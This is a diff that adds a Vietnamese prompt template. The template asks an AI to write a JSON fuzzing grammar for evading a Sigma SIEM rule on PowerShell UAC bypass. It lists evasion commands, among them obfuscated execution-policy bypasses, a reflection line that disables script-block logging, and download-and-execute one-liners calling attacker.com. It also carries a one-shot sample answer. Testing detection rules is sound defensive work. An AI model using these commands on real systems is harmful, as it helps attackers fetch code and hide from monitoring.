@@ -1,0 +1,230 @@
+Bạn là một chuyên gia về an ninh mạng (offensive security) và là một kỹ sư fuzzing.
+Nhiệm vụ của bạn là tạo ra một file văn phạm (grammar) JSON tập trung cao độ (highly-focused) để bypass một rule SIEM cụ thể.
+
+Đây là toàn bộ thông tin đầu vào của bạn:
+---
+
+### 1. Rule Name:
+apt_29_thinktanks_bypass_uac_powershell
+
+### 2. Rule Sigma (Detection Logic):
+
+detection:
+    selection:
+        CommandLine|contains|all:
+            - '-noni'
+            - '-ep'
+            - 'bypass'
+            - '$'
+    condition: selection
+
+
+### 3. Kỹ thuật thay thế (MITRE Techniques):
+
+# T1548.002 - Bypass User Account Control
+
+## 1. PowerShell Execution Policy Bypass
+
+### Method 1.1: Standard bypass flags
+powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Write-Host 'test'"
+powershell.exe -ep bypass -nop -c "Write-Host 'test'"
+powershell -NoProfile -ExecutionPolicy Unrestricted -Command "Write-Host 'test'"
+pwsh.exe -ExecutionPolicy Bypass -NonInteractive -Command "Write-Host 'test'"
+
+### Method 1.2: Short parameter names (obfuscation)
+powershell.exe -noni -ep bypass -c "Write-Host 'test'"
+powershell -NoNI -EP Bypass -C "Write-Host 'test'"
+powershell.exe -NonI -Exec Bypass -Com "Write-Host 'test'"
+
+### Method 1.3: Using environment variables
+%COMSPEC% /c powershell -ep bypass -nop -c "Write-Host 'test'"
+cmd.exe /c powershell.exe -ExecutionPolicy Bypass -Command "$env:TEMP"
+echo powershell -noni -ep bypass | cmd
+
+---
+
+## 2. Base64 Encoding (T1027.010)
+
+### Method 2.1: Encoded command
+powershell.exe -EncodedCommand <base64_payload>
+powershell -enc <base64_payload>
+powershell.exe -e <base64_payload>
+
+### Method 2.2: Combined with bypass
+powershell.exe -nop -ep bypass -enc <base64>
+powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand <base64>
+
+---
+
+## 3. String Obfuscation (T1027.013)
+
+### Method 3.1: String concatenation
+&('pow'+'ershell') -nop -ep bypass -c "Write-Host 'test'"
+&('powershe'+'ll.exe') -ExecutionPolicy Bypass -Command "$PSVersionTable"
+
+### Method 3.2: Variable substitution
+$a='powershell'; &$a -ep bypass -c "Write-Host 'test'"
+$cmd='ep'; powershell.exe -$cmd bypass -nop -c "Write-Host 'test'"
+
+### Method 3.3: Character replacement
+powershell.exe -noni -ep by`pass -c "Write-Host 'test'"
+powershell -NoN`I -EP B`yp`ass -C "Write-Host 'test'"
+
+---
+
+## 4. Process Injection / Alternative Execution
+
+### Method 4.1: WMIC
+wmic process call create "powershell.exe -ep bypass -nop -c 'Write-Host test'"
+wmic /node:localhost process call create "powershell -noni -ep bypass"
+
+### Method 4.2: Start-Process
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-ep","bypass","-c","Write-Host 'test'"
+Start-Process powershell.exe -NoNewWindow -ArgumentList "-noni","-ep","bypass"
+
+### Method 4.3: Invoke-Expression
+powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')"
+powershell -nop -ep bypass -c "iex (iwr 'http://example.com/script.ps1')"
+
+---
+
+## 5. COM Object Abuse (T1559.001)
+
+### Method 5.1: WScript.Shell
+cscript //nologo //e:vbscript -c "CreateObject("WScript.Shell").Run "powershell -ep bypass""
+wscript.exe script.vbs
+
+### Method 5.2: PowerShell via COM
+powershell -c "$c = New-Object -ComObject WScript.Shell; $c.Run('powershell -ep bypass')"
+
+---
+
+## 6. Registry Modification (T1112)
+
+### Method 6.1: Disable ExecutionPolicy via Registry
+reg add HKCU\Software\Microsoft\PowerShell\ShellIds\Microsoft.PowerShell /v ExecutionPolicy /t REG_SZ /d Bypass /f
+powershell -c "Set-ExecutionPolicy Bypass -Scope CurrentUser -Force"
+
+---
+
+## 7. Script Block Logging Evasion (T1562.002)
+
+### Method 7.1: Disable logging
+powershell -c "$GP=[ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static'); $GP.SetValue($null,$null)"
+
+### Method 7.2: Obfuscated logging bypass
+powershell -nop -ep bypass -c "[Reflection.Assembly]::Load(...)"
+
+---
+
+## 8. Alternative PowerShell Hosts
+
+### Method 8.1: PowerShell ISE
+powershell_ise.exe -NoProfile -Command "Write-Host 'test'"
+
+### Method 8.2: PowerShell Core (pwsh)
+pwsh.exe -NoProfile -ExecutionPolicy Bypass -Command "$PSVersionTable"
+pwsh -ep bypass -noni -c "Write-Host 'test'"
+
+---
+
+## 9. Fileless Execution (T1027.011)
+
+### Method 9.1: Direct script execution
+powershell -c "Write-Host 'test'; $env:TEMP"
+powershell -nop -ep bypass -c "[System.Diagnostics.Process]::Start('calc.exe')"
+
+### Method 9.2: Download and execute
+powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
+powershell -noni -ep bypass -c "curl http://attacker.com/payload.ps1 | iex"
+
+---
+
+## 10. Environment Variable Abuse
+
+### Method 10.1: Using $PSHome
+$env:PSHome = 'C:\Windows\System32\WindowsPowerShell1.0'; powershell -ep bypass
+
+### Method 10.2: Custom environment variables
+$env:EP='bypass'; powershell -ExecutionPolicy $env:EP -Command "Write-Host 'test'"
+
+### 4. Thư viện Kỹ thuật (Primitives):
+
+#### Wrappers (Vỏ bọc)
+[
+  "cmd.exe /c {}",
+  "cmd.exe /r {}",
+  "echo {} | cmd",
+  "%COMSPEC% /c {}",
+  "cmd < {}"
+]
+
+#### Obfuscation (Ví dụ làm rối cho 'some_keyword'):
+[
+  "\"7z.exe\"",
+  "\"7Z.EXE\"",
+  "\"7z.exe\"",
+  "\"7^z.exe\"",
+  "\"7z\"\".exe\"",
+  "\"7z\"&\".exe\""
+]
+
+#### Noise (Gây nhiễu):
+[
+  "\"\"",
+  "&::",
+  "REM rác"
+]
+
+---
+
+### YÊU CẦU:
+
+Dựa trên các thông tin trên, hãy **TỰ ĐỘNG PHÂN TÍCH** các từ khóa (keywords) và logic, sau đó **TẠO RA** một file văn phạm JSON hoàn chỉnh.
+
+File văn phạm PHẢI tuân thủ các logic sau:
+
+1.  **Cấu trúc file:** JSON phải có 2 key chính: "rules" và "weights".
+2.  **Quy tắc Gốc (<start>):** Phải là một lựa chọn (trong 'weights') tên là "<wrapper_choice>", bao gồm TẤT CẢ các wrapper trong thư viện. Quy tắc "rules" `<start>` sẽ trỏ đến "<wrapper_choice>".
+3.  **Quy tắc Logic (<payload>):** Phải có một lựa chọn tên là "<payload_choice>" (trong 'weights') cho phép fuzzer chọn giữa:
+    * "<sigma_payload>" (để tấn công các từ khóa của Rule Sigma)
+    * "<mitre_payload>" (để tấn công logic bằng các kỹ thuật thay thế)
+4.  **Quy tắc Sigma (<sigma_payload>):**
+    * **Phân tích** 'Rule Sigma (Detection)' để tìm các TỪ KHÓA (ví dụ: '7z.exe', '.dmp') và LOGIC (ví dụ: 'all of', 'contains', 'endswith').
+    * **Tạo** các quy tắc lựa chọn (ví dụ: "<obf_7z_exe>", "<obf_dmp>") cho TỪNG TỪ KHÓA bạn tìm thấy, sử dụng logic từ 'Thư viện Obfuscation'.
+    * **Tạo** quy tắc sequence "<sigma_payload>" để kết hợp các quy tắc obfuscation này và 'Thư viện Noise' theo đúng 'LOGIC' (ví dụ: "all of" nghĩa là phải có cả hai).
+5.  **Quy tắc MITRE (<mitre_payload>):**
+    * **Phân tích** 'MITRE Techniques' để tìm các LỆNH thay thế (ví dụ: 'makecab.exe ...', 'powershell.exe...Compression.ZipFile').
+    * **Tạo** một lựa chọn (trong 'weights') tên là "<mitre_choice>" để fuzzer chọn một trong các lệnh này. Quy tắc "rules" `<mitre_payload>` sẽ trỏ đến "<mitre_choice>".
+6.  **Trọng số (Weights):** Tất cả các lựa chọn ban đầu phải có trọng số là `1.0`.
+7.  **Tính Sáng tạo (Quan trọng):** Dựa trên logic của 'Thư viện Obfuscation', hãy **tự mình đề xuất thêm 1-2 biến thể obfuscation mới** (ví dụ: dùng biến môi trường như `%COMSPEC%`) và thêm chúng vào các quy tắc lựa chọn (choice) có liên quan.
+
+---
+### OUTPUT (CHỈ JSON):
+
+Chỉ trả về nội dung file JSON. Không giải thích. Không viết gì khác..
+### ĐẦU RA JSON MẪU (ONE-SHOT EXAMPLE)
+
+Đây là file JSON đầu ra "chuẩn" cho ví dụ trên:
+
+```json
+{
+  "rules": {
+    "<start>": "<wrapper_choice>",
+    "<payload>": "<sigma_payload>",
+    "<sigma_payload>": "<obf_whoami>"
+  },
+  "weights": {
+    "<wrapper_choice>": {
+      "cmd.exe /c <payload>": 1.0,
+      "echo <payload> | cmd": 1.0
+    },
+    "<obf_whoami>": {
+      "\"whoami.exe\"": 1.0,
+      "\"WHOAMI.EXE\"": 1.0,
+      "\"who^ami.exe\"": 1.0,
+      "\"who\"\"ami.exe\"": 1.0
+    }
+  }
+}
+```
